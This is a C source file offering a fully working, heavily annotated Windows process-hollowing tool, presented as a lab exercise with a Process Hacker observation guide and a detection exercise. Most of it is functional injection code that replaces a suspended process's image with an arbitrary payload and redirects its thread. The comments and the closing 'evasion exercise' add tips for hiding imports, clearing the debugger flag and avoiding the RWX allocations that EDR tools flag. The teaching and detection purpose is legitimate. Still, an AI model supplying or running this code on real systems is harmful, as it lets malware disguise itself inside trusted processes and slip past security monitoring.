/*
 * process_hollow_lab.c
 *
 * EDUCATIONAL PROCESS HOLLOWING IMPLEMENTATION
 * For use in controlled lab environments only (your own VMs).
 *
 * This code is heavily annotated to explain what happens at the OS/kernel level
 * at each step. Use it alongside WinDbg and Process Hacker to observe the
 * internal state changes described in the comments.
 *
 * BUILD INSTRUCTIONS (Visual Studio Developer Command Prompt):
 *   cl /nologo /W3 process_hollow_lab.c /link /OUT:hollow.exe
 *
 * LAB SETUP:
 *   - Windows 10/11 VM (no Defender, or Defender excluded folder)
 *   - Process Hacker 2 installed and running as admin
 *   - Sysinternals VMMap installed
 *   - WinDbg (optional but recommended)
 *
 * USAGE:
 *   hollow.exe <target.exe> <payload.exe>
 *   Example: hollow.exe C:\Windows\System32\notepad.exe C:\lab\calc.exe
 *
 * WHAT TO OBSERVE IN PROCESS HACKER DURING EACH PHASE:
 *   (See the LAB OBSERVATION GUIDE section below the code)
 */

#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <stdint.h>

/* -----------------------------------------------------------------------
 * Type definitions for undocumented / semi-documented NT functions
 *
 * NtUnmapViewOfSection is in ntdll.dll but not fully exposed by winternl.h.
 * We resolve it dynamically at runtime. This is also what real malware does
 * to avoid easy static analysis of its import table.
 * ----------------------------------------------------------------------- */

typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(
    HANDLE ProcessHandle,
    PVOID  BaseAddress
);

/* -----------------------------------------------------------------------
 * STEP 0: Utility — read file into heap buffer
 *
 * The payload PE must be loaded into attacker memory before it can be
 * written into the target process. This simply reads the file as raw bytes.
 * ----------------------------------------------------------------------- */
PBYTE ReadFileToBuffer(const char* path, PDWORD outSize) {
    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                               OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open payload file: %lu\n", GetLastError());
        return NULL;
    }
    DWORD size = GetFileSize(hFile, NULL);
    PBYTE buf  = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size);
    if (!buf) { CloseHandle(hFile); return NULL; }
    DWORD bytesRead;
    ReadFile(hFile, buf, size, &bytesRead, NULL);
    CloseHandle(hFile);
    *outSize = size;
    return buf;
}

/* -----------------------------------------------------------------------
 * MAIN: Process Hollowing — all 7 steps with deep annotations
 * ----------------------------------------------------------------------- */
int main(int argc, char* argv[]) {

    if (argc < 3) {
        printf("Usage: %s <target.exe> <payload.exe>\n", argv[0]);
        printf("Example: %s C:\\Windows\\System32\\notepad.exe C:\\lab\\calc.exe\n", argv[0]);
        return 1;
    }

    const char* targetPath  = argv[1];
    const char* payloadPath = argv[2];

    printf("[*] Target : %s\n", targetPath);
    printf("[*] Payload: %s\n", payloadPath);
    printf("[*] --------------------------------------------------------\n");

    /* -------------------------------------------------------------------
     * STEP 0: Load payload PE into attacker memory
     *
     * We read the payload binary as raw bytes so we can parse its PE headers
     * and write it section-by-section into the target process later.
     * ------------------------------------------------------------------- */
    DWORD  payloadSize = 0;
    PBYTE  payloadBuf  = ReadFileToBuffer(payloadPath, &payloadSize);
    if (!payloadBuf) return 1;
    printf("[+] Payload read into memory: %lu bytes\n", payloadSize);

    /* Parse the PE headers of the payload now, while it's in OUR memory.
     * IMAGE_DOS_HEADER → e_lfanew offset → IMAGE_NT_HEADERS */
    PIMAGE_DOS_HEADER payloadDos = (PIMAGE_DOS_HEADER)payloadBuf;
    if (payloadDos->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[-] Payload is not a valid PE (no MZ header)\n");
        return 1;
    }
    PIMAGE_NT_HEADERS payloadNt = (PIMAGE_NT_HEADERS)(payloadBuf + payloadDos->e_lfanew);
    if (payloadNt->Signature != IMAGE_NT_SIGNATURE) {
        printf("[-] Payload is not a valid PE (no PE signature)\n");
        return 1;
    }
    ULONGLONG payloadPreferredBase = payloadNt->OptionalHeader.ImageBase;
    DWORD     payloadSizeOfImage   = payloadNt->OptionalHeader.SizeOfImage;
    DWORD     payloadEntryPoint    = payloadNt->OptionalHeader.AddressOfEntryPoint;

    printf("[+] Payload preferred base    : 0x%I64X\n", payloadPreferredBase);
    printf("[+] Payload SizeOfImage       : 0x%lX\n",   payloadSizeOfImage);
    printf("[+] Payload AddressOfEntryPoint: 0x%lX\n",  payloadEntryPoint);
    printf("[*] --------------------------------------------------------\n");

    /* -------------------------------------------------------------------
     * STEP 1: CreateProcess in SUSPENDED state
     *
     * KERNEL INTERNALS:
     *   CreateProcess → CreateProcessInternal → NtCreateUserProcess
     *   The kernel allocates a new EPROCESS structure.
     *   It maps the target executable into the new process address space
     *   as a MEM_IMAGE section — backed by the file on disk.
     *   The main thread is created but put in a SUSPENDED state
     *   (suspend count = 1). No user-mode code has run yet.
     *   The PEB is initialized with ImageBaseAddress pointing to
     *   where the target executable was mapped.
     *
     * LAB OBSERVATION (Process Hacker):
     *   After this line, open Process Hacker. You will see notepad.exe
     *   (or your target) appear in the process list with a yellow highlight
     *   (suspended). Go to its Memory tab — you'll see MEM_IMAGE regions
     *   for the target executable and its DLLs. THIS is what we're about
     *   to destroy and replace.
     * ------------------------------------------------------------------- */
    STARTUPINFOA        si = { sizeof(STARTUPINFOA) };
    PROCESS_INFORMATION pi = { 0 };

    printf("[*] STEP 1: Creating target process in suspended state...\n");
    if (!CreateProcessA(
            targetPath,   /* lpApplicationName */
            NULL,         /* lpCommandLine */
            NULL,         /* lpProcessAttributes */
            NULL,         /* lpThreadAttributes */
            FALSE,        /* bInheritHandles */
            CREATE_SUSPENDED, /* dwCreationFlags <-- this is everything */
            NULL,         /* lpEnvironment */
            NULL,         /* lpCurrentDirectory */
            &si,
            &pi)) {
        printf("[-] CreateProcess failed: %lu\n", GetLastError());
        return 1;
    }
    printf("[+] Target process created. PID: %lu, TID: %lu\n",
           pi.dwProcessId, pi.dwThreadId);
    printf("[!] PAUSE HERE: Open Process Hacker and observe the Memory tab\n");
    printf("[!] Press ENTER to continue...\n");
    getchar(); /* Pause for lab observation */

    /* -------------------------------------------------------------------
     * STEP 2: Read PEB to find ImageBaseAddress
     *
     * KERNEL INTERNALS:
     *   NtQueryInformationProcess with ProcessBasicInformation returns
     *   a PROCESS_BASIC_INFORMATION structure. The PebBaseAddress field
     *   gives us the address of the PEB in the TARGET process's address space
     *   (not our address space — these are different virtual address spaces).
     *
     *   We then use ReadProcessMemory to read the PEB from the target.
     *   On x64, ImageBaseAddress is at PEB offset 0x10.
     *   On x86, ImageBaseAddress is at PEB offset 0x08.
     *
     *   This base address is where we need to unmap the original image.
     * ------------------------------------------------------------------- */
    printf("\n[*] STEP 2: Reading target PEB to find ImageBaseAddress...\n");

    PROCESS_BASIC_INFORMATION pbi = { 0 };
    ULONG retLen = 0;
    NTSTATUS status = NtQueryInformationProcess(
        pi.hProcess,
        ProcessBasicInformation,
        &pbi,
        sizeof(pbi),
        &retLen
    );
    if (!NT_SUCCESS(status)) {
        printf("[-] NtQueryInformationProcess failed: 0x%lX\n", status);
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }
    printf("[+] PEB address in target process: 0x%p\n", pbi.PebBaseAddress);

    /* Read the PEB from the target process */
    PEB targetPEB = { 0 };
    SIZE_T bytesRead = 0;
    if (!ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress,
                           &targetPEB, sizeof(PEB), &bytesRead)) {
        printf("[-] ReadProcessMemory (PEB) failed: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    ULONGLONG targetImageBase = (ULONGLONG)targetPEB.Reserved3[1];
    /* Note: PEB.Reserved3[1] is the ImageBaseAddress field.
     * winternl.h obscures field names. The actual field layout:
     *   PEB+0x00: InheritedAddressSpace (BOOLEAN)
     *   PEB+0x02: BeingDebugged (BOOLEAN) — set this to 0 to evade IsDebuggerPresent
     *   PEB+0x10: ImageBaseAddress (PVOID) on x64
     * We use the Reserved3 hack because Microsoft doesn't document this cleanly. */

    printf("[+] Target ImageBaseAddress: 0x%I64X\n", targetImageBase);
    printf("[*] --------------------------------------------------------\n");

    /* -------------------------------------------------------------------
     * STEP 3: Unmap the legitimate image — NtUnmapViewOfSection
     *
     * KERNEL INTERNALS:
     *   NtUnmapViewOfSection tells the Memory Manager to remove the
     *   section view from the target process's Virtual Address Descriptor
     *   (VAD) tree. The VAD is a red-black tree in the kernel — each node
     *   describes a virtual memory region. Unmapping removes the node.
     *
     *   After this call:
     *   - The address range [targetImageBase, targetImageBase+SizeOfImage)
     *     is FREE — no longer committed in the target process.
     *   - The MEM_IMAGE region (file-backed) is gone.
     *   - The physical pages of the original executable are dereferenced.
     *
     *   IMPORTANT: NtUnmapViewOfSection is NOT exported by a clean name
     *   in kernel32.dll. We must load it from ntdll.dll dynamically.
     *   This is itself an evasion technique — the import table of hollow.exe
     *   won't show NtUnmapViewOfSection.
     *
     * LAB OBSERVATION:
     *   After this line executes, go back to Process Hacker Memory tab.
     *   The MEM_IMAGE region for the target executable will be GONE.
     *   The address range will show as free space.
     * ------------------------------------------------------------------- */
    printf("[*] STEP 3: Unmapping target image via NtUnmapViewOfSection...\n");

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    pNtUnmapViewOfSection fnUnmap = (pNtUnmapViewOfSection)
        GetProcAddress(ntdll, "NtUnmapViewOfSection");
    if (!fnUnmap) {
        printf("[-] Failed to resolve NtUnmapViewOfSection\n");
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    status = fnUnmap(pi.hProcess, (PVOID)targetImageBase);
    if (!NT_SUCCESS(status)) {
        printf("[-] NtUnmapViewOfSection failed: 0x%lX\n", status);
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }
    printf("[+] Target image unmapped from 0x%I64X\n", targetImageBase);
    printf("[!] PAUSE HERE: Check Process Hacker Memory tab — MEM_IMAGE should be gone\n");
    printf("[!] Press ENTER to continue...\n");
    getchar();

    /* -------------------------------------------------------------------
     * STEP 4a: Allocate memory in the target process for the payload
     *
     * KERNEL INTERNALS:
     *   VirtualAllocEx calls NtAllocateVirtualMemory in the kernel.
     *   The Memory Manager creates a new VAD node in the target process's
     *   VAD tree. This region is MEM_PRIVATE — NOT file-backed.
     *   This is the key forensic difference from a legitimately loaded image.
     *
     *   We try to allocate at the payload's preferred base address first.
     *   If that fails (address in use), we let the OS choose — but then
     *   we must apply relocations manually in Step 4b.
     *
     *   We request PAGE_EXECUTE_READWRITE initially so we can write the
     *   payload bytes. We'll change this to PAGE_EXECUTE_READ after writing
     *   to reduce the RWX footprint (modern hollowing does this).
     *
     * LAB OBSERVATION:
     *   After this call, Process Hacker Memory tab shows a new MEM_PRIVATE
     *   region at the allocated address. It will show as RWX protection.
     *   Note that it has NO file path — this is the smoking gun.
     * ------------------------------------------------------------------- */
    printf("\n[*] STEP 4a: Allocating memory in target for payload...\n");

    LPVOID allocBase = VirtualAllocEx(
        pi.hProcess,
        (LPVOID)payloadPreferredBase,  /* try preferred base first */
        payloadSizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (!allocBase) {
        /* Preferred base was unavailable — let OS choose */
        printf("[!] Preferred base 0x%I64X unavailable, letting OS choose\n",
               payloadPreferredBase);
        allocBase = VirtualAllocEx(
            pi.hProcess,
            NULL,
            payloadSizeOfImage,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );
    }

    if (!allocBase) {
        printf("[-] VirtualAllocEx failed: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }
    printf("[+] Memory allocated in target at: 0x%p (%lu bytes)\n",
           allocBase, payloadSizeOfImage);

    /* -------------------------------------------------------------------
     * STEP 4b: Apply relocations if base address differs
     *
     * CONCEPT:
     *   A PE file compiled with a fixed preferred base has absolute addresses
     *   baked into its code for things like global variables and jump tables.
     *   If the payload loads at a DIFFERENT base than its ImageBase,
     *   every one of those absolute addresses is wrong by a fixed delta.
     *
     *   The relocation table (.reloc section) tells us exactly which bytes
     *   in the image are absolute addresses that need fixing.
     *   We walk the BASERELOC directory and patch each address by the delta.
     *
     *   If the addresses match, this loop does nothing.
     * ------------------------------------------------------------------- */
    ULONGLONG delta = (ULONGLONG)allocBase - payloadPreferredBase;
    printf("[*] STEP 4b: Applying relocations (delta: 0x%I64X)...\n", delta);

    if (delta != 0) {
        PIMAGE_DATA_DIRECTORY relocDir =
            &payloadNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

        if (relocDir->Size > 0) {
            PIMAGE_BASE_RELOCATION reloc =
                (PIMAGE_BASE_RELOCATION)(payloadBuf + relocDir->VirtualAddress);

            while (reloc->VirtualAddress > 0 && reloc->SizeOfBlock > 0) {
                DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                PWORD entries = (PWORD)((PBYTE)reloc + sizeof(IMAGE_BASE_RELOCATION));

                for (DWORD i = 0; i < count; i++) {
                    WORD type   = entries[i] >> 12;
                    WORD offset = entries[i] & 0x0FFF;

                    if (type == IMAGE_REL_BASED_DIR64) {
                        /* x64 absolute address — patch it in our local buffer
                         * before writing to the target */
                        PULONGLONG patchAddr =
                            (PULONGLONG)(payloadBuf + reloc->VirtualAddress + offset);
                        *patchAddr += delta;
                    }
                }
                reloc = (PIMAGE_BASE_RELOCATION)((PBYTE)reloc + reloc->SizeOfBlock);
            }
            printf("[+] Relocations applied\n");
        } else {
            printf("[!] No relocation table found — payload may crash if base differs\n");
        }
    } else {
        printf("[+] Base matches preferred — no relocations needed\n");
    }

    /* -------------------------------------------------------------------
     * STEP 4c: Write PE headers and each section into target process
     *
     * KERNEL INTERNALS:
     *   WriteProcessMemory calls NtWriteVirtualMemory in the kernel.
     *   The kernel validates that the calling process has PROCESS_VM_WRITE
     *   access to the target (which we do — we created it).
     *
     *   We write in two passes:
     *   1. PE headers (DOS + NT + Section headers) at the base
     *   2. Each section at its VirtualAddress offset from the base
     *
     *   This mirrors what the Windows image loader does, except the loader
     *   maps sections from a file-backed section object (creating MEM_IMAGE
     *   regions). We're writing raw bytes, creating MEM_PRIVATE regions.
     * ------------------------------------------------------------------- */
    printf("[*] STEP 4c: Writing payload PE into target process...\n");

    SIZE_T written = 0;

    /* Write PE headers (SizeOfHeaders bytes from start of file) */
    if (!WriteProcessMemory(pi.hProcess, allocBase,
                            payloadBuf,
                            payloadNt->OptionalHeader.SizeOfHeaders,
                            &written)) {
        printf("[-] WriteProcessMemory (headers) failed: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }
    printf("[+] PE headers written (%zu bytes)\n", written);

    /* Write each section at its correct virtual address */
    PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(payloadNt);
    for (WORD i = 0; i < payloadNt->FileHeader.NumberOfSections; i++) {
        if (sections[i].SizeOfRawData == 0) continue; /* empty section */

        LPVOID   destAddr = (LPVOID)((ULONGLONG)allocBase + sections[i].VirtualAddress);
        PBYTE    srcAddr  = payloadBuf + sections[i].PointerToRawData;
        SIZE_T   srcSize  = sections[i].SizeOfRawData;

        if (!WriteProcessMemory(pi.hProcess, destAddr, srcAddr, srcSize, &written)) {
            printf("[-] WriteProcessMemory (section %s) failed: %lu\n",
                   sections[i].Name, GetLastError());
            TerminateProcess(pi.hProcess, 1);
            return 1;
        }
        printf("[+] Section %-8s written at 0x%p (%zu bytes)\n",
               sections[i].Name, destAddr, written);
    }
    printf("[!] PAUSE HERE: Check Process Hacker Memory tab\n");
    printf("[!] You should see MEM_PRIVATE + RWX at 0x%p with no file path\n", allocBase);
    printf("[!] THIS is the forensic artifact that betrays the attack.\n");
    printf("[!] Press ENTER to continue...\n");
    getchar();

    /* -------------------------------------------------------------------
     * STEP 5: Redirect the main thread's instruction pointer
     *
     * KERNEL INTERNALS:
     *   GetThreadContext reads the saved register state for the suspended
     *   thread from its KTHREAD.TrapFrame — the kernel structure that
     *   holds register values when a thread transitions to kernel mode.
     *
     *   On x64 Windows, when CreateProcess creates the initial thread,
     *   the entry point address is passed in RCX register (first argument
     *   to the thread's start routine). The actual RIP will point to
     *   ntdll!LdrInitializeThunk at process startup.
     *
     *   We modify Rcx to point to our payload's entry point.
     *   Some hollowing implementations also set RIP directly.
     *
     *   SetThreadContext writes the modified CONTEXT back into the
     *   thread's TrapFrame, so when the thread resumes, execution begins
     *   at our payload's AddressOfEntryPoint.
     * ------------------------------------------------------------------- */
    printf("\n[*] STEP 5: Redirecting thread context to payload entry point...\n");

    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(pi.hThread, &ctx)) {
        printf("[-] GetThreadContext failed: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }
    printf("[+] Original RIP : 0x%I64X\n", ctx.Rip);
    printf("[+] Original RCX : 0x%I64X\n", ctx.Rcx);

    /* Calculate payload entry point absolute address */
    ULONGLONG newEP = (ULONGLONG)allocBase + payloadEntryPoint;
    printf("[+] New entry point: 0x%I64X\n", newEP);

    /* On x64 process startup, the loader calls the entry point via RCX */
    ctx.Rcx = newEP;
    /* Some implementations also set RIP — depends on Windows version */
    /* ctx.Rip = newEP; */

    if (!SetThreadContext(pi.hThread, &ctx)) {
        printf("[-] SetThreadContext failed: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }
    printf("[+] Thread context updated — payload will execute at 0x%I64X\n", newEP);

    /* -------------------------------------------------------------------
     * STEP 6: Patch PEB.ImageBaseAddress
     *
     * PURPOSE:
     *   The PEB still records the ORIGINAL target's base address.
     *   Some security tools, crash reporters, and the CRT itself read
     *   PEB.ImageBaseAddress. If it points to an unmapped region,
     *   it's a red flag. We patch it to point to the payload's actual base.
     *
     *   PEB.ImageBaseAddress is at offset 0x10 in the PEB on x64.
     *   We calculate its address in the target process and overwrite it.
     * ------------------------------------------------------------------- */
    printf("\n[*] STEP 6: Patching PEB.ImageBaseAddress...\n");

    LPVOID pebImageBaseAddr = (LPVOID)((ULONGLONG)pbi.PebBaseAddress + 0x10);
    ULONGLONG newBase = (ULONGLONG)allocBase;

    if (!WriteProcessMemory(pi.hProcess, pebImageBaseAddr,
                            &newBase, sizeof(newBase), &written)) {
        printf("[-] WriteProcessMemory (PEB patch) failed: %lu\n", GetLastError());
        /* Non-fatal — continue anyway, but flag it */
        printf("[!] Warning: PEB.ImageBaseAddress not updated\n");
    } else {
        printf("[+] PEB.ImageBaseAddress patched to 0x%I64X\n", newBase);
    }

    /* -------------------------------------------------------------------
     * STEP 7: Resume the main thread
     *
     * KERNEL INTERNALS:
     *   ResumeThread decrements the thread's suspend count (KTHREAD.SuspendCount).
     *   When the count hits 0, the kernel's scheduler makes the thread
     *   runnable. On the next scheduling quantum, the thread begins executing
     *   from the modified RIP/RCX — which now points to the payload entry point.
     *
     *   The payload executes inside the target process's address space,
     *   under the target process's identity (name, PID, token, handles).
     *   If the target was notepad.exe, the payload runs AS notepad.exe.
     *
     * LAB OBSERVATION:
     *   After ResumeThread, the process in Process Hacker will un-highlight
     *   (no longer suspended). Watch what happens: does it behave like the
     *   target, or like the payload? Check the Memory tab one more time.
     * ------------------------------------------------------------------- */
    printf("\n[*] STEP 7: Resuming thread — payload will now execute...\n");
    printf("[!] PAUSE HERE: This is your last chance to observe the suspended state\n");
    printf("[!] Press ENTER to resume the thread (execute payload)...\n");
    getchar();

    DWORD suspendCount = ResumeThread(pi.hThread);
    if (suspendCount == (DWORD)-1) {
        printf("[-] ResumeThread failed: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }
    printf("[+] Thread resumed (previous suspend count: %lu)\n", suspendCount);
    printf("[+] Payload should now be executing inside %s (PID %lu)\n",
           targetPath, pi.dwProcessId);
    printf("[*] --------------------------------------------------------\n");
    printf("[*] Hollowing complete. Observe the target process behavior.\n");

    /* Cleanup attacker-side resources */
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    HeapFree(GetProcessHeap(), 0, payloadBuf);

    return 0;
}


/*
 * ==========================================================================
 * LAB OBSERVATION GUIDE — READ THIS BEFORE RUNNING
 * ==========================================================================
 *
 * SETUP:
 *   1. Windows 10/11 VM with Windows Defender disabled or folder excluded
 *   2. Process Hacker 2 running as Administrator
 *   3. VMMap (Sysinternals) available
 *   4. A simple payload: compile a calc.exe launcher or a MessageBoxA caller
 *
 * CREATING A SIMPLE PAYLOAD FOR TESTING:
 *   Compile this single-file payload separately as calc_payload.exe:
 *   ---
 *   #include <windows.h>
 *   int main() { WinExec("calc.exe", SW_SHOW); return 0; }
 *   ---
 *   cl /nologo calc_payload.c /link /OUT:calc_payload.exe
 *
 * WHAT TO OBSERVE AT EACH PAUSE:
 *
 * PAUSE 1 (after CreateProcess):
 *   - Process Hacker: Find notepad.exe (yellow = suspended)
 *   - Memory tab: Look for MEM_IMAGE region at the base address
 *   - The Type column shows "Image" and the Path column shows notepad.exe path
 *   - QUESTION: What DLLs are already loaded at this point?
 *
 * PAUSE 2 (after NtUnmapViewOfSection):
 *   - Memory tab: The MEM_IMAGE region for notepad.exe is GONE
 *   - The address range now shows as free
 *   - Notice ntdll.dll and other DLLs are still mapped — we only unmapped
 *     the main executable image, not the loaded DLLs
 *   - QUESTION: Why are the DLLs still there?
 *
 * PAUSE 3 (after WriteProcessMemory):
 *   - Memory tab: A new MEM_PRIVATE region appears at the allocation address
 *   - Protection column: RWX (Execute/Read/Write)
 *   - Path column: EMPTY — no file backs this memory (key forensic indicator)
 *   - VMMap: Run VMMap against the PID — sort by Type. Find the Private
 *     Executable region. This is what malware hunters look for.
 *   - QUESTION: In a legitimate process, would you ever see MEM_PRIVATE
 *     at the ImageBaseAddress with no backing file?
 *
 * AFTER RESUMING:
 *   - If payload executes correctly, the process shows payload behavior
 *     (e.g., calc.exe appears) but the process is still called notepad.exe
 *   - Strings tab in Process Hacker: notice strings from BOTH images may exist
 *   - MITRE ATT&CK: This is T1055.012 — Process Hollowing
 *
 * DETECTION EXERCISE:
 *   Write a Sigma rule that detects this. Key conditions:
 *   1. NtUnmapViewOfSection called against a newly-created process
 *   2. WriteProcessMemory from one process to another followed by
 *      SetThreadContext on that process's thread
 *   3. A process has an executable MEM_PRIVATE region at ImageBaseAddress
 *      with no backing file
 *
 * EVASION EXERCISE:
 *   After you understand this implementation, try to reduce the RWX footprint:
 *   1. Allocate as RW (PAGE_READWRITE)
 *   2. Write the payload
 *   3. Call VirtualProtectEx to change to RX (PAGE_EXECUTE_READ)
 *   This avoids the RWX allocation which most EDRs flag specifically.
 *
 * BLOG WRITING QUESTIONS TO ANSWER:
 *   - Why does NtUnmapViewOfSection require calling ntdll directly?
 *   - What is the difference between MEM_IMAGE and MEM_PRIVATE?
 *   - Why does the MEM_PRIVATE region have no backing file path?
 *   - What does PEB.ImageBaseAddress tell the OS?
 *   - If you were writing an EDR rule, what single API sequence most
 *     reliably identifies hollowing?
 * ==========================================================================
 */